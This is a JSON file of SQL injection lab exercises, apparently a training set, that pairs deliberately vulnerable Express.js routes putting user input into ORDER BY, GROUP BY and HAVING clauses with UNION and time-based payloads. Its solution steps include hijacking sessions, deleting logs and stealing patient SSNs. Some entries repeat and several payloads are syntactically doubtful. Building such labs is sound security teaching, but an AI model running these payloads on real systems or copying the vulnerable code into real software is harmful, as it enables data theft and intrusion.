[
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking application dynamically sorts transaction history based on user input without sanitizing the 'sort' parameter. This enables SQL injection via ORDER BY manipulation. The application echoes detailed SQL errors when invalid sorting fields are requested. To solve: Extract full table information by abusing ORDER BY injection vulnerabilities.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept traffic using Burp Suite during sorting transactions",
      "Fuzz 'sort' parameter with large numeric values (ORDER BY 10, 20, etc.)",
      "Inject 'ORDER BY 1--' to confirm column count via response analysis",
      "Use UNION SELECT to enumerate database structure",
      "Extract table and column names for user credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const sortBy = req.query.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sortBy}`;\n  db.query(query, (err, results) => {\n    if (err) return res.send('Error: ' + err.sqlMessage);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1--",
      "2--",
      "1 UNION SELECT NULL, username, password FROM users--",
      "1 UNION SELECT username, password, NULL FROM admin_users--"
    ]
  },
  {
    "Lab scenario": "CMS Platform SQL Injection in GROUP BY Clause",
    "Lab Description": "The CMS uses unfiltered user-provided category IDs to group blog posts. Improperly handled GROUP BY inputs allow SQL injection. The verbose logging system exposes internal query structure during errors. To solve: Leak administrative tokens from a hidden 'admin_tokens' table via GROUP BY injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture group filter requests via OWASP ZAP",
      "Inject invalid syntax into 'category_id' parameter",
      "Use Boolean-based payloads to manipulate GROUP BY",
      "Construct UNION SELECT chain to access admin tokens",
      "Verify token leakage through altered CMS admin panel behavior"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/posts', (req, res) => {\n  const categoryId = req.query.category;\n  const sql = `SELECT title, content FROM posts GROUP BY ${categoryId}`;\n  db.query(sql, (err, data) => {\n    if (err) res.send('SQL Error: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "1--",
      "1 UNION SELECT token,NULL,NULL FROM admin_tokens--",
      "1) UNION SELECT email,password,NULL FROM users--",
      "' UNION SELECT 1,2,3 FROM admin_tokens--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard aggregates device statistics and filters them through a vulnerable HAVING clause. Lack of input sanitization in device metrics allows an attacker to inject SQL through manipulated thresholds. To solve: Dump sensitive firmware update URLs stored within a hidden settings table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use sqlmap to automate HAVING clause fuzzing on the metrics API",
      "Manually inject time-delay payloads to validate blind injection",
      "Chain multiple Boolean conditions to infer table structures",
      "Leverage UNION payloads to exfiltrate firmware URLs",
      "Capture firmware URLs through server error logs or API responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/device-stats', (req, res) => {\n  const threshold = req.body.threshold;\n  const query = `SELECT device_id, AVG(temp) FROM stats HAVING AVG(temp) > ${threshold}`;\n  db.query(query, (err, result) => {\n    if (err) res.status(500).send('Error: ' + err.sqlMessage);\n    else res.json(result);\n  });\n});",
    "payloads": [
      "1 OR 1=1--",
      "1 HAVING 1=1 UNION SELECT NULL, firmware_url FROM settings--",
      "1 HAVING 1=1 AND SLEEP(5)--",
      "1 HAVING AVG(temp) = AVG(temp) UNION SELECT NULL, update_link FROM firmware--"
    ]
  },
  {
    "Lab scenario": "CMS Platform SQL Injection in HAVING Clause",
    "Lab Description": "The CMS admin panel aggregates page views, filtering them through a vulnerable HAVING clause without sanitization. This allows attackers to inject SQL commands to control aggregation behavior. To solve: Exploit the HAVING clause to leak internal admin credentials via a UNION-based payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept traffic to the admin panel with Burp Suite",
      "Inject threshold parameters with SQL expressions to validate vulnerability",
      "Craft UNION SELECT payloads targeting admin credentials",
      "Use time-based blind payloads to infer database structures",
      "Retrieve admin user credentials from the CMS backend"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/analytics', (req, res) => {\n  const views = req.query.views;\n  const query = `SELECT page, COUNT(*) FROM analytics HAVING COUNT(*) > ${views}`;\n  db.query(query, (err, rows) => {\n    if (err) res.status(400).send('Query Error: ' + err.sqlMessage);\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "10 UNION SELECT username,password FROM admins--",
      "5 HAVING 1=1--",
      "5 UNION SELECT session_id,email FROM admin_sessions--",
      "1 OR 1=1--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in ORDER BY Clause",
    "Lab Description": "An API Gateway sorts user-supplied data directly in SQL ORDER BY clauses. No parameterization exists, exposing raw queries to injection risks. When invalid columns are referenced, verbose API error messages are returned. To solve: Manipulate ORDER BY to expose hidden 'admin_logs' data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send crafted sort parameters via Postman",
      "Observe server error behavior with invalid ORDER BY inputs",
      "Craft UNION payload injecting admin_logs table",
      "Iteratively retrieve admin activity history via payload chaining",
      "Analyze admin log records to reveal sensitive actions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/users', (req, res) => {\n  const sort = req.query.sort;\n  const sql = `SELECT * FROM users ORDER BY ${sort}`;\n  db.query(sql, (error, results) => {\n    if (error) res.status(500).send('Error: ' + error.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "1--",
      "id--",
      "id UNION SELECT id, activity FROM admin_logs--",
      "1 UNION SELECT username,password FROM admins--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking application groups user transaction types based on input from a 'group' parameter. Lack of validation enables SQL injection within GROUP BY. The system displays database error messages when grouping fails. To solve: Extract and enumerate privileged account types using GROUP BY injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture transaction grouping requests with OWASP ZAP",
      "Inject invalid characters to detect SQL parsing errors",
      "Use Boolean payloads to validate GROUP BY vulnerability",
      "Craft UNION SELECT payloads to extract account type info",
      "Enumerate privileged accounts and administrative privileges"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions/group', (req, res) => {\n  const group = req.query.group;\n  const sql = `SELECT COUNT(*), ${group} FROM transactions GROUP BY ${group}`;\n  db.query(sql, (err, data) => {\n    if (err) res.status(500).send('SQL Error: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "account_type--",
      "1 UNION SELECT role, NULL FROM user_roles--",
      "group_id UNION SELECT email,password FROM admins--",
      "account_id OR 1=1--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard orders sensor data based on user-supplied field names without sanitization. This allows ORDER BY SQL injection through crafted requests. To solve: Extract sensitive device keys stored in a hidden 'iot_keys' table via injected ORDER BY clauses.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept device list sorting",
      "Fuzz 'sortField' parameter to find vulnerable injection points",
      "Send crafted UNION payloads inserting iot_keys table access",
      "Analyze extracted keys from verbose error messages",
      "Confirm exfiltrated device keys by accessing private endpoints"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/devices', (req, res) => {\n  const sortField = req.query.sort;\n  const sql = `SELECT * FROM devices ORDER BY ${sortField}`;\n  db.query(sql, (err, results) => {\n    if (err) res.status(400).send('SQL Injection Error: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "device_id--",
      "1 UNION SELECT device_id, device_key FROM iot_keys--",
      "temperature UNION SELECT username,password FROM users--",
      "1 OR 1=1--"
    ]
  },
  {
    "Lab scenario": "CMS Platform SQL Injection in HAVING Clause",
    "Lab Description": "The CMS aggregates comment statistics and filters them through a vulnerable HAVING clause. Improperly validated comment count filters expose SQL injection risks. To solve: Dump the CMS user session table by exploiting the HAVING clause via Boolean-based and time-based techniques.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use sqlmap targeting comment statistics APIs",
      "Inject logical conditions to validate HAVING injection",
      "Perform time-based blind injections to map database schema",
      "Craft UNION SELECT queries leaking user session IDs",
      "Use harvested sessions to hijack CMS admin accounts"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/comments/stats', (req, res) => {\n  const filter = req.query.filter;\n  const sql = `SELECT post_id, COUNT(*) FROM comments GROUP BY post_id HAVING COUNT(*) > ${filter}`;\n  db.query(sql, (err, results) => {\n    if (err) res.status(500).send('DB Error: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "1 OR 1=1--",
      "10 UNION SELECT session_id, username FROM user_sessions--",
      "1 HAVING 1=1 AND SLEEP(5)--",
      "1 HAVING COUNT(*)=COUNT(*) UNION SELECT token, NULL FROM sessions--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in GROUP BY Clause",
    "Lab Description": "An API Gateway aggregates logs grouped by user agent strings. User-supplied input is passed directly into the GROUP BY clause without sanitization. Verbose error messages reveal SQL parsing issues. To solve: Inject payloads to retrieve internal log files stored in the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture aggregation requests via Postman",
      "Inject invalid syntax into 'group' parameter",
      "Confirm GROUP BY injection via Boolean-based payloads",
      "Craft UNION SELECT injections targeting log file metadata",
      "Dump internal error logs through crafted responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/logs', (req, res) => {\n  const groupBy = req.body.group;\n  const query = `SELECT COUNT(*), ${groupBy} FROM logs GROUP BY ${groupBy}`;\n  db.query(query, (err, data) => {\n    if (err) res.send('SQL Error: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "user_agent--",
      "1 UNION SELECT file_path, file_size FROM internal_logs--",
      "os_version UNION SELECT username,password FROM users--",
      "device_type OR 1=1--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT platform aggregates average sensor readings using a vulnerable HAVING filter controlled by the user. Improper sanitization enables advanced HAVING clause injections. To solve: Leak internal device firmware versions by crafting UNION payloads exploiting aggregation logic.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept aggregated device reading API",
      "Fuzz threshold parameters to confirm injection points",
      "Inject Boolean conditions and measure server response time",
      "Craft UNION SELECTs leaking firmware version info",
      "Collect firmware details and attempt device firmware downgrade attacks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/devices/aggregate', (req, res) => {\n  const threshold = req.body.threshold;\n  const sql = `SELECT AVG(temp), device_id FROM readings GROUP BY device_id HAVING AVG(temp) > ${threshold}`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error: ' + err.sqlMessage);\n    else res.json(result);\n  });\n});",
    "payloads": [
      "1 HAVING 1=1--",
      "5 UNION SELECT firmware_version, NULL FROM firmware_data--",
      "1 OR 1=1 AND SLEEP(5)--",
      "2 UNION SELECT update_link,NULL FROM firmware_updates--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal sorts user transactions based on dynamic parameters with no input validation. This enables ORDER BY clause SQL injection, causing errors or data leakage. To solve: Exploit the ORDER BY injection to enumerate database schema and exfiltrate high-value account information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept sort functionality using Burp Suite",
      "Inject invalid ORDER BY clauses to trigger errors",
      "Use Boolean-based payloads to confirm vulnerability",
      "Deploy UNION SELECTs to enumerate database tables",
      "Extract privileged account details for admin access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions/sort', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) res.status(400).send('SQL Injection: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "amount--",
      "1 UNION SELECT username, password FROM users--",
      "id OR 1=1--",
      "1 ORDER BY 1000--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in GROUP BY Clause",
    "Lab Description": "The IoT dashboard's device analytics feature groups device status reports without proper sanitization of user input. Attackers can exploit this to perform GROUP BY SQL injection. To solve: Extract hidden device metadata by leveraging GROUP BY clause injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept group analytics requests",
      "Fuzz group field to cause SQL errors",
      "Confirm injection via Boolean-based techniques",
      "Craft UNION queries to leak metadata fields",
      "Collect leaked firmware version, OS info, and device IDs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics/group', (req, res) => {\n  const groupField = req.query.group;\n  const sql = `SELECT COUNT(*), ${groupField} FROM status_reports GROUP BY ${groupField}`;\n  db.query(sql, (err, data) => {\n    if (err) res.status(500).send('Error: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "device_type--",
      "1 UNION SELECT firmware_version, NULL FROM device_metadata--",
      "1 OR 1=1--",
      "device_id UNION SELECT user, password FROM admin_users--"
    ]
  },
  {
    "Lab scenario": "CMS Platform SQL Injection in ORDER BY Clause",
    "Lab Description": "A CMS allows users to sort blog posts based on custom input without input validation, leading to ORDER BY clause SQL injection. To solve: Exploit the injection to retrieve hidden administrative user accounts and related login details.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept CMS post sorting with Postman",
      "Inject random inputs into the sort parameter",
      "Confirm ORDER BY vulnerability with errors",
      "Use UNION SELECT payloads to retrieve usernames and passwords",
      "Login as admin using leaked credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/posts/sort', (req, res) => {\n  const sortBy = req.query.sort;\n  const sql = `SELECT * FROM posts ORDER BY ${sortBy}`;\n  db.query(sql, (err, posts) => {\n    if (err) res.status(500).send('Error: ' + err.sqlMessage);\n    else res.json(posts);\n  });\n});",
    "payloads": [
      "title--",
      "1 UNION SELECT username, password FROM admin_users--",
      "created_at OR 1=1--",
      "id UNION SELECT NULL, NULL FROM dual--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in HAVING Clause",
    "Lab Description": "An API Gateway aggregates event statistics and allows filtering using vulnerable HAVING clauses. Lack of input sanitization exposes SQL injection opportunities. To solve: Leak internal access tokens stored in hidden tables by manipulating HAVING filters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use sqlmap to automate HAVING clause injection detection",
      "Confirm vulnerability by sending time-based payloads",
      "Craft UNION queries to retrieve token information",
      "Extract and reuse leaked tokens to access protected APIs",
      "Obfuscate exploit trail by deleting access logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/events/aggregate', (req, res) => {\n  const threshold = req.query.threshold;\n  const sql = `SELECT COUNT(*), event_type FROM events GROUP BY event_type HAVING COUNT(*) > ${threshold}`;\n  db.query(sql, (err, data) => {\n    if (err) res.status(500).send('SQL Issue: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "10 OR 1=1--",
      "5 UNION SELECT token, NULL FROM access_tokens--",
      "1 HAVING 1=1 AND SLEEP(5)--",
      "1 UNION SELECT username,password FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT platform sorts device logs based on client input, but input is directly embedded in ORDER BY clauses. Lack of validation results in SQL injection vulnerability. To solve: Exfiltrate network credentials by exploiting sorting functionality.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept sorting API calls via OWASP ZAP",
      "Send malformed ORDER BY values and observe errors",
      "Confirm injection point with Boolean-based payloads",
      "Use UNION SELECT to retrieve Wi-Fi credentials",
      "Access devices using extracted network credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/logs/sort', (req, res) => {\n  const sortField = req.query.sort;\n  const sql = `SELECT * FROM device_logs ORDER BY ${sortField}`;\n  db.query(sql, (err, logs) => {\n    if (err) res.status(400).send('Database Error: ' + err.sqlMessage);\n    else res.json(logs);\n  });\n});",
    "payloads": [
      "timestamp--",
      "1 UNION SELECT ssid,password FROM wifi_credentials--",
      "device_id OR 1=1--",
      "location UNION SELECT NULL,NULL FROM dual--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal allows customers to sort transaction history based on URL parameters directly inserted into an ORDER BY clause. The input is not sanitized or whitelisted, exposing a SQL injection vector. Attackers can manipulate the sort parameter to trigger database errors, enumerate columns, and eventually retrieve sensitive information such as admin account credentials. To solve: Perform ORDER BY-based SQL injection to leak database structure and extract privileged user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture the sort request using Burp Suite Proxy",
      "Inject invalid field names into sort parameter to induce SQL errors",
      "Use Boolean-based payloads to confirm field injection vulnerability",
      "Craft UNION SELECT statements to enumerate columns and retrieve credentials",
      "Login using leaked admin account credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions/sort', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) res.status(400).send('SQL Injection: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "amount--",
      "1 UNION SELECT username, password FROM users--",
      "id OR 1=1--",
      "1 ORDER BY 9999--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in GROUP BY Clause",
    "Lab Description": "The IoT monitoring dashboard aggregates device statistics, allowing dynamic grouping via user-controlled parameters. Improper handling of input within the GROUP BY clause allows injection attacks. By manipulating the group parameter, attackers can leak internal database structure related to devices, such as firmware versions and OS metadata. To solve: Perform GROUP BY SQL injection to reveal hidden attributes of connected IoT devices.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the analytics grouping request",
      "Submit malformed group parameters to trigger SQL errors",
      "Validate injection via Boolean-based behavior differences",
      "Inject UNION SELECT payloads to extract device metadata fields",
      "Aggregate extracted firmware version and device OS information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics/group', (req, res) => {\n  const groupField = req.query.group;\n  const sql = `SELECT COUNT(*), ${groupField} FROM status_reports GROUP BY ${groupField}`;\n  db.query(sql, (err, data) => {\n    if (err) res.status(500).send('Error: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "device_type--",
      "1 UNION SELECT firmware_version, NULL FROM device_metadata--",
      "1 OR 1=1--",
      "device_id UNION SELECT user, password FROM admin_users--"
    ]
  },
  {
    "Lab scenario": "CMS Platform SQL Injection in ORDER BY Clause",
    "Lab Description": "A Content Management System (CMS) platform provides blog sorting features where the sort parameter is concatenated directly into an SQL ORDER BY clause. No input validation or allowlisting is performed. Exploiting this, attackers can craft ORDER BY injection payloads to enumerate sensitive database tables and retrieve admin user login information. To solve: Manipulate the sort parameter to leak user data via UNION-based injection.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to modify blog post sorting requests",
      "Inject arbitrary strings into the sort parameter to generate database errors",
      "Identify the injection point through error analysis",
      "Craft UNION SELECT payloads to retrieve administrative usernames and passwords",
      "Authenticate into the admin dashboard with extracted credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/posts/sort', (req, res) => {\n  const sortBy = req.query.sort;\n  const sql = `SELECT * FROM posts ORDER BY ${sortBy}`;\n  db.query(sql, (err, posts) => {\n    if (err) res.status(500).send('Error: ' + err.sqlMessage);\n    else res.json(posts);\n  });\n});",
    "payloads": [
      "title--",
      "1 UNION SELECT username, password FROM admin_users--",
      "created_at OR 1=1--",
      "id UNION SELECT NULL, NULL FROM dual--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in HAVING Clause",
    "Lab Description": "The API Gateway's event aggregation endpoint filters event data using user-controlled thresholds embedded into a HAVING clause. No input sanitization exists, exposing a SQL injection path. Attackers can inject into the HAVING condition to execute arbitrary queries, bypass authentication layers, and extract OAuth tokens. To solve: Exploit the HAVING clause to leak sensitive access tokens and elevate API privileges.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Run sqlmap targeting the event threshold filter",
      "Detect HAVING clause injection via Boolean- and time-based payloads",
      "Craft UNION-based payloads to enumerate hidden tables",
      "Extract access tokens stored in backend databases",
      "Use extracted tokens to gain access to restricted API endpoints"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/events/aggregate', (req, res) => {\n  const threshold = req.query.threshold;\n  const sql = `SELECT COUNT(*), event_type FROM events GROUP BY event_type HAVING COUNT(*) > ${threshold}`;\n  db.query(sql, (err, data) => {\n    if (err) res.status(500).send('SQL Issue: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "10 OR 1=1--",
      "5 UNION SELECT token, NULL FROM access_tokens--",
      "1 HAVING 1=1 AND SLEEP(5)--",
      "1 UNION SELECT username,password FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard allows sorting of device logs based on user-supplied parameters, which are directly embedded in the ORDER BY clause without validation. Attackers can inject malicious input to manipulate the sorting SQL query, leading to exfiltration of Wi-Fi credentials and device secrets. To solve: Craft ORDER BY clause payloads that leak device network credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept API sorting requests using OWASP ZAP",
      "Send malformed sort parameters to cause backend SQL parsing errors",
      "Confirm vulnerability using Boolean-based injections",
      "Exploit using UNION SELECT payloads to dump Wi-Fi SSID and password fields",
      "Access device networks with recovered credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/logs/sort', (req, res) => {\n  const sortField = req.query.sort;\n  const sql = `SELECT * FROM device_logs ORDER BY ${sortField}`;\n  db.query(sql, (err, logs) => {\n    if (err) res.status(400).send('Database Error: ' + err.sqlMessage);\n    else res.json(logs);\n  });\n});",
    "payloads": [
      "timestamp--",
      "1 UNION SELECT ssid,password FROM wifi_credentials--",
      "device_id OR 1=1--",
      "location UNION SELECT NULL,NULL FROM dual--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal's fraud analytics endpoint groups transactions and applies user-defined filters via a HAVING clause. Inputs are directly interpolated into the SQL query, enabling injection. Attackers can inject logical operations and delay functions (e.g., SLEEP()) to perform blind inference attacks. MySQL-specific error messages (e.g., 'Operand should contain 1 column(s)') provide hints during exploitation. To solve: Perform blind SQLi exploiting the HAVING filter to extract account balances and manipulate risk scoring.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept fraud analytics API call using Burp Suite",
      "Submit malformed threshold values and analyze error responses",
      "Validate SQLi via time-based injections (e.g., SLEEP(5))",
      "Craft UNION SELECT payloads to extract account balances",
      "Manipulate extracted balances to bypass fraud detection thresholds"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/fraud/risk', (req, res) => {\n  const amount = req.query.amount;\n  const query = `SELECT account_id, SUM(amount) FROM transactions GROUP BY account_id HAVING SUM(amount) > ${amount}`;\n  db.query(query, (err, results) => {\n    if (err) res.status(400).send('Fraud Analysis Error: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "100 OR 1=1--",
      "1 HAVING 1=1 AND SLEEP(5)--",
      "0 UNION SELECT username, password FROM users--",
      "10 OR EXISTS(SELECT * FROM information_schema.tables)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in GROUP BY Clause",
    "Lab Description": "The IoT dashboard groups smart sensor data based on user-supplied fields without input validation, interpolated into a GROUP BY clause. Improper handling leads to injection risks allowing attackers to extract sensitive device configurations. Specific error messages like 'Unknown column' can help in blind enumeration. To solve: Manipulate group parameters to dump Wi-Fi SSID and secret keys stored in the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept sensor grouping requests",
      "Inject invalid group fields and observe server error feedback",
      "Validate using UNION SELECT payloads to enumerate available columns",
      "Craft payloads to extract device Wi-Fi credentials",
      "Access IoT device management interfaces using stolen secrets"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/sensors/group', (req, res) => {\n  const groupField = req.query.group;\n  const sql = `SELECT ${groupField}, COUNT(*) FROM sensor_data GROUP BY ${groupField}`;\n  db.query(sql, (err, records) => {\n    if (err) res.status(500).send('Sensor Grouping Error: ' + err.sqlMessage);\n    else res.json(records);\n  });\n});",
    "payloads": [
      "location--",
      "device_id UNION SELECT ssid,password FROM wifi_data--",
      "id OR 1=1--",
      "device_type HAVING 1=1--"
    ]
  },
  {
    "Lab scenario": "CMS Platform SQL Injection in HAVING Clause",
    "Lab Description": "The CMS platform's content ranking system uses a vulnerable HAVING clause to filter blog posts by popularity scores. User input is embedded without validation. Exploiting the input, attackers can inject subqueries and sleep functions to escalate into blind SQL injection. The backend MySQL server leaks syntax errors, aiding payload refinement. To solve: Execute HAVING clause injections to extract administrator session tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST request updating blog scores using Burp Suite",
      "Submit numeric filters with appended SQL logic to provoke errors",
      "Validate the HAVING injection point through time-based payloads",
      "Inject UNION SELECT payloads to leak admin session tokens",
      "Login to admin panel using hijacked session token"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.post('/content/rank', (req, res) => {\n  const score = req.body.score;\n  const sql = `SELECT title, COUNT(*) FROM posts GROUP BY title HAVING AVG(score) > ${score}`;\n  db.query(sql, (err, posts) => {\n    if (err) res.status(500).send('Ranking Error: ' + err.sqlMessage);\n    else res.json(posts);\n  });\n});",
    "payloads": [
      "5 HAVING 1=1--",
      "0 UNION SELECT session_token, NULL FROM admin_sessions--",
      "1 HAVING SLEEP(5)--",
      "10 OR EXISTS(SELECT 1)--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in ORDER BY Clause",
    "Lab Description": "The API gateway allows clients to sort API responses dynamically based on query parameters directly embedded in ORDER BY clauses. Absence of sanitization introduces SQL injection vulnerabilities. Attackers can manipulate sort fields to execute arbitrary queries and extract hidden customer metadata. Specific behaviors like MySQL's 'You have an error in your SQL syntax' aid in payload tuning. To solve: Perform ORDER BY SQLi to dump client records.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to fuzz API sorting parameters",
      "Inject invalid field names to trigger SQL syntax errors",
      "Craft Boolean-based and UNION-based payloads",
      "Extract client email addresses and billing information",
      "Authenticate into hidden premium customer portals"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/clients/sort', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM clients ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) res.status(400).send('API Error: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "email--",
      "1 UNION SELECT email, password FROM users--",
      "created_at OR 1=1--",
      "id HAVING 1=1--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal groups customer transactions by custom-defined fields without input validation. The GROUP BY clause is dynamically assembled from client-side inputs. Malformed inputs result in MySQL-specific 'Unknown column' errors. Attackers can exploit this to inject UNION queries and retrieve sensitive customer transaction logs. To solve: Abuse the group parameter to exfiltrate bank account activity.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture transaction grouping API using Burp Suite",
      "Inject non-existent fields to trigger database error responses",
      "Confirm GROUP BY SQLi by injecting Boolean-based payloads",
      "Use UNION SELECT to extract transaction amounts and timestamps",
      "Analyze stolen data for financial reconnaissance"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/banking/transactions/group', (req, res) => {\n  const field = req.query.field;\n  const sql = `SELECT ${field}, SUM(amount) FROM transactions GROUP BY ${field}`;\n  db.query(sql, (err, data) => {\n    if (err) res.status(500).send('Transaction Error: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "transaction_type--",
      "1 UNION SELECT account_number, balance FROM accounts--",
      "1 HAVING 1=1--",
      "date OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Healthcare App SQL Injection via HAVING Clause (PostgreSQL)",
    "Lab Description": "The healthcare platform's patient analytics module aggregates medical test results. A user-supplied severity score is passed into a vulnerable HAVING clause without input validation. In PostgreSQL, error messages like 'column must appear in the GROUP BY clause' leak useful information. Attackers can exploit this flaw to enumerate patients and exfiltrate health record identifiers. To solve: Exploit HAVING clause injection to dump patient IDs.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture lab result aggregation requests in Burp Suite",
      "Inject invalid HAVING conditions to trigger PostgreSQL error messages",
      "Confirm blind SQLi via time-based injections (e.g., pg_sleep(5))",
      "Inject UNION SELECT payloads to extract patient identifiers",
      "Access protected health data using stolen patient IDs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/analytics/patient', (req, res) => {\n  const severity = req.body.severity;\n  const sql = `SELECT patient_id, COUNT(*) FROM test_results GROUP BY patient_id HAVING AVG(severity) > ${severity}`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Analytics Error: ' + err.message);\n    else res.json(result);\n  });\n});",
    "payloads": [
      "5 OR 1=1--",
      "0 UNION SELECT patient_name, ssn FROM patients--",
      "1 HAVING pg_sleep(5)--",
      "10 OR EXISTS(SELECT 1)--"
    ]
  },
  {
    "Lab scenario": "E-commerce Site SQL Injection in ORDER BY Clause (Microsoft SQL Server)",
